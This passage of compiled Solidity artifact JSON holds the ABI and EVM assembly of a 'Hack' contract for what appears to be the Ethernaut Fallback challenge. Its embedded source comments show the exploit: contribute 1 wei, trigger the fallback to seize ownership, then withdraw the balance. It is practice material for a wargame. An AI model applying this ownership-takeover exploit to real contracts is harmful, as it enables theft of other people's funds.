{
	"security/etheranut/Fallback/Hack.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getContribution",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getOwner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"security/etheranut/Fallback/Hack.sol\":1016:1699  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"security/etheranut/Fallback/Hack.sol\":1070:1112  0x0D82eD8db37DA41CA5e0370C1C321c9b816Baff2 */\n  0x0d82ed8db37da41ca5e0370c1c321c9b816baff2\n    /* \"security/etheranut/Fallback/Hack.sol\":1037:1113  address payable target = payable(0x0D82eD8db37DA41CA5e0370C1C321c9b816Baff2) */\n  0x00\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Fallback/Hack.sol\":1143:1149  target */\n  0x00\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"security/etheranut/Fallback/Hack.sol\":1120:1150  Fallback fb = Fallback(target) */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Fallback/Hack.sol\":1016:1699  contract Hack {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"security/etheranut/Fallback/Hack.sol\":1016:1699  contract Hack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x893d20e8\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xf10fdf5c\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"security/etheranut/Fallback/Hack.sol\":1575:1659  function getOwner() public view returns(address){... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_8\n      jumpi\n      revert(0x00, 0x00)\n    tag_8:\n      pop\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      tag_11\n      swap2\n      swap1\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/Fallback/Hack.sol\":1161:1460  function attack() public payable {... */\n    tag_4:\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      stop\n        /* \"security/etheranut/Fallback/Hack.sol\":1468:1569  function getContribution() public view returns(uint256){... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_15\n      jumpi\n      revert(0x00, 0x00)\n    tag_15:\n      pop\n      tag_16\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      tag_18\n      swap2\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/Fallback/Hack.sol\":1575:1659  function getOwner() public view returns(address){... */\n    tag_10:\n        /* \"security/etheranut/Fallback/Hack.sol\":1615:1622  address */\n      0x00\n        /* \"security/etheranut/Fallback/Hack.sol\":1641:1643  fb */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Fallback/Hack.sol\":1641:1649  fb.owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8da5cb5b\n        /* \"security/etheranut/Fallback/Hack.sol\":1641:1651  fb.owner() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_22\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_22:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_23\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_23:\n        /* \"security/etheranut/Fallback/Hack.sol\":1634:1651  return fb.owner() */\n      swap1\n      pop\n        /* \"security/etheranut/Fallback/Hack.sol\":1575:1659  function getOwner() public view returns(address){... */\n      swap1\n      jump\t// out\n        /* \"security/etheranut/Fallback/Hack.sol\":1161:1460  function attack() public payable {... */\n    tag_14:\n        /* \"security/etheranut/Fallback/Hack.sol\":1205:1207  fb */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Fallback/Hack.sol\":1205:1218  fb.contribute */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd7bb99ba\n        /* \"security/etheranut/Fallback/Hack.sol\":1225:1230  1 wei */\n      0x01\n        /* \"security/etheranut/Fallback/Hack.sol\":1205:1233  fb.contribute{value:1 wei}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_26\n      jumpi\n      revert(0x00, 0x00)\n    tag_26:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_28\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_28:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Fallback/Hack.sol\":1245:1257  bool success */\n      0x00\n        /* \"security/etheranut/Fallback/Hack.sol\":1263:1269  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Fallback/Hack.sol\":1263:1274  target.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Fallback/Hack.sol\":1282:1287  1 wei */\n      0x01\n        /* \"security/etheranut/Fallback/Hack.sol\":1263:1292  target.call{value: 1 wei}(\"\") */\n      mload(0x40)\n      tag_29\n      swap1\n      tag_30\n      jump\t// in\n    tag_29:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_33\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_32)\n    tag_33:\n      0x60\n      swap2\n      pop\n    tag_32:\n      pop\n        /* \"security/etheranut/Fallback/Hack.sol\":1244:1292  (bool success, ) = target.call{value: 1 wei}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"security/etheranut/Fallback/Hack.sol\":1323:1330  success */\n      dup1\n        /* \"security/etheranut/Fallback/Hack.sol\":1315:1355  require(success, \"Fallback call failed\") */\n      tag_34\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_35\n      swap1\n      tag_36\n      jump\t// in\n    tag_35:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_34:\n        /* \"security/etheranut/Fallback/Hack.sol\":1396:1400  this */\n      address\n        /* \"security/etheranut/Fallback/Hack.sol\":1374:1401  fb.owner() == address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Fallback/Hack.sol\":1374:1376  fb */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Fallback/Hack.sol\":1374:1382  fb.owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8da5cb5b\n        /* \"security/etheranut/Fallback/Hack.sol\":1374:1384  fb.owner() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_38\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_38:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_39\n      swap2\n      swap1\n      tag_24\n      jump\t// in\n    tag_39:\n        /* \"security/etheranut/Fallback/Hack.sol\":1374:1401  fb.owner() == address(this) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"security/etheranut/Fallback/Hack.sol\":1366:1428  require(fb.owner() == address(this), \"Hack is not the owner!\") */\n      tag_40\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_41\n      swap1\n      tag_42\n      jump\t// in\n    tag_41:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_40:\n        /* \"security/etheranut/Fallback/Hack.sol\":1439:1441  fb */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Fallback/Hack.sol\":1439:1450  fb.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"security/etheranut/Fallback/Hack.sol\":1439:1452  fb.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_43\n      jumpi\n      revert(0x00, 0x00)\n    tag_43:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_45\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_45:\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Fallback/Hack.sol\":1194:1460  {... */\n      pop\n        /* \"security/etheranut/Fallback/Hack.sol\":1161:1460  function attack() public payable {... */\n      jump\t// out\n        /* \"security/etheranut/Fallback/Hack.sol\":1468:1569  function getContribution() public view returns(uint256){... */\n    tag_17:\n        /* \"security/etheranut/Fallback/Hack.sol\":1515:1522  uint256 */\n      0x00\n        /* \"security/etheranut/Fallback/Hack.sol\":1541:1543  fb */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Fallback/Hack.sol\":1541:1559  fb.getContribution */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xf10fdf5c\n        /* \"security/etheranut/Fallback/Hack.sol\":1541:1561  fb.getContribution() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_48:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_49\n      swap2\n      swap1\n      tag_50\n      jump\t// in\n    tag_49:\n        /* \"security/etheranut/Fallback/Hack.sol\":1534:1561  return fb.getContribution() */\n      swap1\n      pop\n        /* \"security/etheranut/Fallback/Hack.sol\":1468:1569  function getContribution() public view returns(uint256){... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_51:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_52:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_74\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_51\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_53:\n        /* \"#utility.yul\":328:352   */\n      tag_76\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_52\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_12:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_78\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_53\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":593:670   */\n    tag_54:\n        /* \"#utility.yul\":630:637   */\n      0x00\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":648:664   */\n      swap1\n      pop\n        /* \"#utility.yul\":593:670   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":676:794   */\n    tag_55:\n        /* \"#utility.yul\":763:787   */\n      tag_81\n        /* \"#utility.yul\":781:786   */\n      dup2\n        /* \"#utility.yul\":763:787   */\n      tag_54\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":758:761   */\n      dup3\n        /* \"#utility.yul\":751:788   */\n      mstore\n        /* \"#utility.yul\":676:794   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":800:1022   */\n    tag_19:\n        /* \"#utility.yul\":893:897   */\n      0x00\n        /* \"#utility.yul\":931:933   */\n      0x20\n        /* \"#utility.yul\":920:929   */\n      dup3\n        /* \"#utility.yul\":916:934   */\n      add\n        /* \"#utility.yul\":908:934   */\n      swap1\n      pop\n        /* \"#utility.yul\":944:1015   */\n      tag_83\n        /* \"#utility.yul\":1012:1013   */\n      0x00\n        /* \"#utility.yul\":1001:1010   */\n      dup4\n        /* \"#utility.yul\":997:1014   */\n      add\n        /* \"#utility.yul\":988:994   */\n      dup5\n        /* \"#utility.yul\":944:1015   */\n      tag_55\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":800:1022   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1109:1226   */\n    tag_57:\n        /* \"#utility.yul\":1218:1219   */\n      0x00\n        /* \"#utility.yul\":1215:1216   */\n      0x00\n        /* \"#utility.yul\":1208:1220   */\n      revert\n        /* \"#utility.yul\":1355:1477   */\n    tag_59:\n        /* \"#utility.yul\":1428:1452   */\n      tag_88\n        /* \"#utility.yul\":1446:1451   */\n      dup2\n        /* \"#utility.yul\":1428:1452   */\n      tag_52\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":1421:1426   */\n      dup2\n        /* \"#utility.yul\":1418:1453   */\n      eq\n        /* \"#utility.yul\":1408:1471   */\n      tag_89\n      jumpi\n        /* \"#utility.yul\":1467:1468   */\n      0x00\n        /* \"#utility.yul\":1464:1465   */\n      0x00\n        /* \"#utility.yul\":1457:1469   */\n      revert\n        /* \"#utility.yul\":1408:1471   */\n    tag_89:\n        /* \"#utility.yul\":1355:1477   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1483:1626   */\n    tag_60:\n        /* \"#utility.yul\":1540:1545   */\n      0x00\n        /* \"#utility.yul\":1571:1577   */\n      dup2\n        /* \"#utility.yul\":1565:1578   */\n      mload\n        /* \"#utility.yul\":1556:1578   */\n      swap1\n      pop\n        /* \"#utility.yul\":1587:1620   */\n      tag_91\n        /* \"#utility.yul\":1614:1619   */\n      dup2\n        /* \"#utility.yul\":1587:1620   */\n      tag_59\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":1483:1626   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1632:1983   */\n    tag_24:\n        /* \"#utility.yul\":1702:1708   */\n      0x00\n        /* \"#utility.yul\":1751:1753   */\n      0x20\n        /* \"#utility.yul\":1739:1748   */\n      dup3\n        /* \"#utility.yul\":1730:1737   */\n      dup5\n        /* \"#utility.yul\":1726:1749   */\n      sub\n        /* \"#utility.yul\":1722:1754   */\n      slt\n        /* \"#utility.yul\":1719:1838   */\n      iszero\n      tag_93\n      jumpi\n        /* \"#utility.yul\":1757:1836   */\n      tag_94\n      tag_57\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":1719:1838   */\n    tag_93:\n        /* \"#utility.yul\":1877:1878   */\n      0x00\n        /* \"#utility.yul\":1902:1966   */\n      tag_95\n        /* \"#utility.yul\":1958:1965   */\n      dup5\n        /* \"#utility.yul\":1949:1955   */\n      dup3\n        /* \"#utility.yul\":1938:1947   */\n      dup6\n        /* \"#utility.yul\":1934:1956   */\n      add\n        /* \"#utility.yul\":1902:1966   */\n      tag_60\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":1892:1966   */\n      swap2\n      pop\n        /* \"#utility.yul\":1848:1976   */\n      pop\n        /* \"#utility.yul\":1632:1983   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1989:2136   */\n    tag_61:\n        /* \"#utility.yul\":2090:2101   */\n      0x00\n        /* \"#utility.yul\":2127:2130   */\n      dup2\n        /* \"#utility.yul\":2112:2130   */\n      swap1\n      pop\n        /* \"#utility.yul\":1989:2136   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2142:2256   */\n    tag_62:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2262:2660   */\n    tag_63:\n        /* \"#utility.yul\":2421:2424   */\n      0x00\n        /* \"#utility.yul\":2442:2525   */\n      tag_99\n        /* \"#utility.yul\":2523:2524   */\n      0x00\n        /* \"#utility.yul\":2518:2521   */\n      dup4\n        /* \"#utility.yul\":2442:2525   */\n      tag_61\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":2435:2525   */\n      swap2\n      pop\n        /* \"#utility.yul\":2534:2627   */\n      tag_100\n        /* \"#utility.yul\":2623:2626   */\n      dup3\n        /* \"#utility.yul\":2534:2627   */\n      tag_62\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":2652:2653   */\n      0x00\n        /* \"#utility.yul\":2647:2650   */\n      dup3\n        /* \"#utility.yul\":2643:2654   */\n      add\n        /* \"#utility.yul\":2636:2654   */\n      swap1\n      pop\n        /* \"#utility.yul\":2262:2660   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2666:3045   */\n    tag_30:\n        /* \"#utility.yul\":2850:2853   */\n      0x00\n        /* \"#utility.yul\":2872:3019   */\n      tag_102\n        /* \"#utility.yul\":3015:3018   */\n      dup3\n        /* \"#utility.yul\":2872:3019   */\n      tag_63\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":2865:3019   */\n      swap2\n      pop\n        /* \"#utility.yul\":3036:3039   */\n      dup2\n        /* \"#utility.yul\":3029:3039   */\n      swap1\n      pop\n        /* \"#utility.yul\":2666:3045   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3051:3220   */\n    tag_64:\n        /* \"#utility.yul\":3135:3146   */\n      0x00\n        /* \"#utility.yul\":3169:3175   */\n      dup3\n        /* \"#utility.yul\":3164:3167   */\n      dup3\n        /* \"#utility.yul\":3157:3176   */\n      mstore\n        /* \"#utility.yul\":3209:3213   */\n      0x20\n        /* \"#utility.yul\":3204:3207   */\n      dup3\n        /* \"#utility.yul\":3200:3214   */\n      add\n        /* \"#utility.yul\":3185:3214   */\n      swap1\n      pop\n        /* \"#utility.yul\":3051:3220   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3226:3396   */\n    tag_65:\n        /* \"#utility.yul\":3366:3388   */\n      0x46616c6c6261636b2063616c6c206661696c6564000000000000000000000000\n        /* \"#utility.yul\":3362:3363   */\n      0x00\n        /* \"#utility.yul\":3354:3360   */\n      dup3\n        /* \"#utility.yul\":3350:3364   */\n      add\n        /* \"#utility.yul\":3343:3389   */\n      mstore\n        /* \"#utility.yul\":3226:3396   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3402:3768   */\n    tag_66:\n        /* \"#utility.yul\":3544:3547   */\n      0x00\n        /* \"#utility.yul\":3565:3632   */\n      tag_106\n        /* \"#utility.yul\":3629:3631   */\n      0x14\n        /* \"#utility.yul\":3624:3627   */\n      dup4\n        /* \"#utility.yul\":3565:3632   */\n      tag_64\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":3558:3632   */\n      swap2\n      pop\n        /* \"#utility.yul\":3641:3734   */\n      tag_107\n        /* \"#utility.yul\":3730:3733   */\n      dup3\n        /* \"#utility.yul\":3641:3734   */\n      tag_65\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":3759:3761   */\n      0x20\n        /* \"#utility.yul\":3754:3757   */\n      dup3\n        /* \"#utility.yul\":3750:3762   */\n      add\n        /* \"#utility.yul\":3743:3762   */\n      swap1\n      pop\n        /* \"#utility.yul\":3402:3768   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3774:4193   */\n    tag_36:\n        /* \"#utility.yul\":3940:3944   */\n      0x00\n        /* \"#utility.yul\":3978:3980   */\n      0x20\n        /* \"#utility.yul\":3967:3976   */\n      dup3\n        /* \"#utility.yul\":3963:3981   */\n      add\n        /* \"#utility.yul\":3955:3981   */\n      swap1\n      pop\n        /* \"#utility.yul\":4027:4036   */\n      dup2\n        /* \"#utility.yul\":4021:4025   */\n      dup2\n        /* \"#utility.yul\":4017:4037   */\n      sub\n        /* \"#utility.yul\":4013:4014   */\n      0x00\n        /* \"#utility.yul\":4002:4011   */\n      dup4\n        /* \"#utility.yul\":3998:4015   */\n      add\n        /* \"#utility.yul\":3991:4038   */\n      mstore\n        /* \"#utility.yul\":4055:4186   */\n      tag_109\n        /* \"#utility.yul\":4181:4185   */\n      dup2\n        /* \"#utility.yul\":4055:4186   */\n      tag_66\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":4047:4186   */\n      swap1\n      pop\n        /* \"#utility.yul\":3774:4193   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4199:4371   */\n    tag_67:\n        /* \"#utility.yul\":4339:4363   */\n      0x4861636b206973206e6f7420746865206f776e65722100000000000000000000\n        /* \"#utility.yul\":4335:4336   */\n      0x00\n        /* \"#utility.yul\":4327:4333   */\n      dup3\n        /* \"#utility.yul\":4323:4337   */\n      add\n        /* \"#utility.yul\":4316:4364   */\n      mstore\n        /* \"#utility.yul\":4199:4371   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4377:4743   */\n    tag_68:\n        /* \"#utility.yul\":4519:4522   */\n      0x00\n        /* \"#utility.yul\":4540:4607   */\n      tag_112\n        /* \"#utility.yul\":4604:4606   */\n      0x16\n        /* \"#utility.yul\":4599:4602   */\n      dup4\n        /* \"#utility.yul\":4540:4607   */\n      tag_64\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":4533:4607   */\n      swap2\n      pop\n        /* \"#utility.yul\":4616:4709   */\n      tag_113\n        /* \"#utility.yul\":4705:4708   */\n      dup3\n        /* \"#utility.yul\":4616:4709   */\n      tag_67\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":4734:4736   */\n      0x20\n        /* \"#utility.yul\":4729:4732   */\n      dup3\n        /* \"#utility.yul\":4725:4737   */\n      add\n        /* \"#utility.yul\":4718:4737   */\n      swap1\n      pop\n        /* \"#utility.yul\":4377:4743   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4749:5168   */\n    tag_42:\n        /* \"#utility.yul\":4915:4919   */\n      0x00\n        /* \"#utility.yul\":4953:4955   */\n      0x20\n        /* \"#utility.yul\":4942:4951   */\n      dup3\n        /* \"#utility.yul\":4938:4956   */\n      add\n        /* \"#utility.yul\":4930:4956   */\n      swap1\n      pop\n        /* \"#utility.yul\":5002:5011   */\n      dup2\n        /* \"#utility.yul\":4996:5000   */\n      dup2\n        /* \"#utility.yul\":4992:5012   */\n      sub\n        /* \"#utility.yul\":4988:4989   */\n      0x00\n        /* \"#utility.yul\":4977:4986   */\n      dup4\n        /* \"#utility.yul\":4973:4990   */\n      add\n        /* \"#utility.yul\":4966:5013   */\n      mstore\n        /* \"#utility.yul\":5030:5161   */\n      tag_115\n        /* \"#utility.yul\":5156:5160   */\n      dup2\n        /* \"#utility.yul\":5030:5161   */\n      tag_68\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":5022:5161   */\n      swap1\n      pop\n        /* \"#utility.yul\":4749:5168   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5174:5296   */\n    tag_69:\n        /* \"#utility.yul\":5247:5271   */\n      tag_117\n        /* \"#utility.yul\":5265:5270   */\n      dup2\n        /* \"#utility.yul\":5247:5271   */\n      tag_54\n      jump\t// in\n    tag_117:\n        /* \"#utility.yul\":5240:5245   */\n      dup2\n        /* \"#utility.yul\":5237:5272   */\n      eq\n        /* \"#utility.yul\":5227:5290   */\n      tag_118\n      jumpi\n        /* \"#utility.yul\":5286:5287   */\n      0x00\n        /* \"#utility.yul\":5283:5284   */\n      0x00\n        /* \"#utility.yul\":5276:5288   */\n      revert\n        /* \"#utility.yul\":5227:5290   */\n    tag_118:\n        /* \"#utility.yul\":5174:5296   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5302:5445   */\n    tag_70:\n        /* \"#utility.yul\":5359:5364   */\n      0x00\n        /* \"#utility.yul\":5390:5396   */\n      dup2\n        /* \"#utility.yul\":5384:5397   */\n      mload\n        /* \"#utility.yul\":5375:5397   */\n      swap1\n      pop\n        /* \"#utility.yul\":5406:5439   */\n      tag_120\n        /* \"#utility.yul\":5433:5438   */\n      dup2\n        /* \"#utility.yul\":5406:5439   */\n      tag_69\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":5302:5445   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5451:5802   */\n    tag_50:\n        /* \"#utility.yul\":5521:5527   */\n      0x00\n        /* \"#utility.yul\":5570:5572   */\n      0x20\n        /* \"#utility.yul\":5558:5567   */\n      dup3\n        /* \"#utility.yul\":5549:5556   */\n      dup5\n        /* \"#utility.yul\":5545:5568   */\n      sub\n        /* \"#utility.yul\":5541:5573   */\n      slt\n        /* \"#utility.yul\":5538:5657   */\n      iszero\n      tag_122\n      jumpi\n        /* 